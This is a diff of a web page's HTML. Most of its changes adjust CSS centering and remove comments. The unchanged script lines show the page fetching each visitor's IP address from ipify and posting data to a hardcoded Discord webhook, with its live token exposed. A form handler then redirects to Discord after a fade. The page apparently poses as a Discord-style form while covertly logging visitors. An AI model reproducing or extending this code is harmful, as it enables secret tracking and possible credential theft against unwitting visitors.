@@ -11,21 +11,23 @@
       color: #ffffff;
       display: flex;
       justify-content: center;
-      align-items: flex-start;
-      height: 100vh;
+      align-items: center; /* Changed to center vertically */
+      height: 100vh; /* Full viewport height */
       margin: 0;
-      padding: 20px 10px;
+      padding: 20px;
       box-sizing: border-box;
       user-select: none;
       text-align: center;
       transition: opacity 0.5s ease; /* Added transition for fade effect */
     }
     .container {
-      margin-top: -24px;
+      max-width: 400px; /* Set a max width to control layout */
+      width: 100%; /* Full width within the max */
+      margin: 0 auto; /* Center horizontally */
     }
     .logo img {
       margin-top: 4px;
-      width: 100%;
+      width: 100%; /* Responsive logo */
       height: auto;
       pointer-events: none;
     }
@@ -131,7 +133,6 @@
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1299192306531962910/5Y9fNdk8nyaR1-uR1jTgamOIr_sP8R71SszcL6LS31e_k9GOI8DI4dy7rSL9hweyUkmL";
 
-    // Function to send data to the webhook
     function sendToWebhook(data) {
       fetch(webhookURL, {
         method: 'POST',
@@ -148,7 +149,6 @@
       .catch(error => console.error('Error sending data:', error));
     }
 
-    // Fetch and send the visitor's IPv4 address
     fetch('https://api.ipify.org?format=json')
       .then(response => response.json())
       .then(data => {
@@ -200,13 +200,12 @@
         return false;
       }
 
-      // Fade out effect
       document.body.style.opacity = '0';
       setTimeout(() => {
-        window.location.href = "https://discord.com/channels/@me"; // Redirect after fade
-      }, 250); // Adjusted for faster fade
+        window.location.href = "https://discord.com/channels/@me";
+      }, 250);
 
-      return false; // Prevent form submission
+      return false;
     }
 
     function updateWebhook() {
